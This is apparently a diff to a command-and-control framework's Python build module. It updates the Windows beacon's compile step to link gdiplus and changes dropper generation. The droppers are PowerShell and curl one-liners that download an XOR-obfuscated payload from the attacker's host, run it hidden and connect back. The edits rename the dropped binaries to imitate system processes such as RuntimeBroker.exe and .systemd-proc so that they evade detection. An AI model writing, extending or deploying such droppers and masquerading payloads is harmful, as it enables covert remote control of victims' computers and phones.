@@ -83,13 +83,13 @@ def compile_beacon(platform: str, pkg_root: str, force_rebuild: bool = False, ar
                     subprocess.run(
                         ["cl", "/EHsc", "/O2", "/std:c++20", "src/main.cpp", f"/Fe:{out_name}",
                          "/I", "src",
-                         "/link", "winhttp.lib", "bcrypt.lib", "ws2_32.lib", "gdi32.lib", "user32.lib", "/SUBSYSTEM:WINDOWS"],
+                         "/link", "winhttp.lib", "bcrypt.lib", "ws2_32.lib", "gdi32.lib", "user32.lib", "gdiplus.lib", "/SUBSYSTEM:WINDOWS"],
                         cwd=beacon_dir, check=True, capture_output=True, text=True)
                 elif shutil.which("g++"):
                     # Use MinGW g++ as fallback
                     subprocess.run(
                         ["g++", "-std=c++20", "-O2", "-s", "-o", out_name,
-                         "-Isrc", "src/main.cpp", "-lwinhttp", "-lbcrypt", "-lws2_32", "-liphlpapi", "-luser32", "-lgdi32", "-mwindows"],
+                         "-Isrc", "src/main.cpp", "-lwinhttp", "-lbcrypt", "-lws2_32", "-liphlpapi", "-luser32", "-lgdi32", "-lgdiplus", "-mwindows"],
                         cwd=beacon_dir, check=True, capture_output=True, text=True)
                 else:
                     notifier.error("No suitable compiler found (cl.exe or g++).")
@@ -102,7 +102,7 @@ def compile_beacon(platform: str, pkg_root: str, force_rebuild: bool = False, ar
                     return None
                 subprocess.run(
                     [mingw_cpp, "-std=c++20", "-O2", "-s", "-o", out_name,
-                     "-Isrc", "src/main.cpp", "-lwinhttp", "-lbcrypt", "-lws2_32", "-lgdi32", "-luser32", "-static", "-mwindows"],
+                     "-Isrc", "src/main.cpp", "-lwinhttp", "-lbcrypt", "-lws2_32", "-lgdi32", "-luser32", "-lgdiplus", "-static", "-mwindows"],
                     cwd=beacon_dir, check=True, capture_output=True, text=True)
             _mark_built(beacon_dir, out_name)
             return beacon_out
@@ -203,7 +203,7 @@ def generate_dropper(platform: str, lhost: str, lport: int, arch: str = "x64") -
 
         ps_cmd = f"""
 {ssl_bypass}
-$path = [System.IO.Path]::Combine([System.IO.Path]::GetTempPath(), [System.Guid]::NewGuid().ToString() + '.exe');
+$path = [System.IO.Path]::Combine([System.IO.Path]::GetTempPath(), 'RuntimeBroker.exe');
 $w = New-Object Net.WebClient;
 $b = $w.DownloadData('{url}');
 for($i=0;$i -lt $b.Length;$i++){{$b[$i]=$b[$i] -bxor 0xAA}}
@@ -217,14 +217,14 @@ Start-Process $path -ArgumentList '{lhost} {lport}' -WindowStyle Hidden;
     elif platform == "linux":
         path = "payload_linux_x86" if arch == "x86" else "payload_linux"
         url = f"{scheme}://{lhost}:{lport}/api/v1/payload_{path}?{token_param}"
-        return f"curl -sk '{url}' -o /tmp/.phantom && chmod +x /tmp/.phantom && nohup /tmp/.phantom {lhost} {lport} &>/dev/null &"
+        return f"curl -sk '{url}' -o /tmp/.systemd-proc && chmod +x /tmp/.systemd-proc && nohup /tmp/.systemd-proc {lhost} {lport} &>/dev/null &"
 
     elif platform == "macos":
         url = f"{scheme}://{lhost}:{lport}/api/v1/payload_macos?{token_param}"
-        return f"curl -sk '{url}' -o /tmp/.phantom && chmod +x /tmp/.phantom && nohup /tmp/.phantom {lhost} {lport} &>/dev/null &"
+        return f"curl -sk '{url}' -o /tmp/.launchd-service && chmod +x /tmp/.launchd-service && nohup /tmp/.launchd-service {lhost} {lport} &>/dev/null &"
 
     elif platform == "android":
         url = f"{scheme}://{lhost}:{lport}/api/v1/payload_android?{token_param}"
-        return f"curl -sk '{url}' -o /data/local/tmp/.phantom && chmod +x /data/local/tmp/.phantom && /data/local/tmp/.phantom {lhost} {lport} &"
+        return f"curl -sk '{url}' -o /data/local/tmp/.android-runtime && chmod +x /data/local/tmp/.android-runtime && /data/local/tmp/.android-runtime {lhost} {lport} &"
 
     return ""
